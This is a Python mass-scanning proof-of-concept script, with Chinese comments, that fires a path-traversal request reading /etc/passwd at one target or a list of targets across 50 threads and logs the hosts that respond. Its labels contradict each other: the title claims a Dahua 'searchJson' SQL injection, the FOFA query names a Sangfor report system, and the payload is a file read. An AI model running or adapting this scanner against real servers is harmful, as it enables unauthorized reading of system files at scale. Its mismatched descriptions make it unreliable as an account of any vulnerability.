# 大华智慧园区综合管理平台 searchJson Sql注入漏洞
import argparse,requests,sys,time,re
from termcolor import colored
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

# fofa语句
# app="SANGFOR-应用交付报表系统"


def banner():
    test = """
███████╗██╗  ██╗███████╗    ██████╗ ███████╗ █████╗ ██████╗ 
██╔════╝╚██╗██╔╝██╔════╝    ██╔══██╗██╔════╝██╔══██╗██╔══██╗
███████╗ ╚███╔╝ █████╗█████╗██████╔╝█████╗  ███████║██║  ██║
╚════██║ ██╔██╗ ██╔══╝╚════╝██╔══██╗██╔══╝  ██╔══██║██║  ██║
███████║██╔╝ ██╗██║         ██║  ██║███████╗██║  ██║██████╔╝
╚══════╝╚═╝  ╚═╝╚═╝         ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ 

                                author:果冻                             

"""
    colored_color = colored(test, 'blue')
    print(colored_color)



def main():
    banner()
    parser = argparse.ArgumentParser(description='大华智慧园区综合管理平台 searchJson Sql注入漏洞POC')
    parser.add_argument('-u','--url',dest='url',type=str,help="请输入你要测试的URL")
    parser.add_argument('-f','--file',dest='file',type=str,help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")




def poc(target):
    api_payload = "/report/download.php?pdf=../../../../../etc/passwd"
    try:
        response = requests.get(url=target+api_payload,verify=False,timeout=10)
        if response.status_code == 200 and 'bin' in response.text:
            print(f"[+]{target} 存在任意文件读取漏洞")
            with open('result.txt','a') as fp:
                fp.write(target+'\n')
        else:
            print(f"[-]{target} 不存在任意文件读取漏洞")
    except:
        print(f"[X]{target} 该站点无法访问")



if __name__ == '__main__':
    main()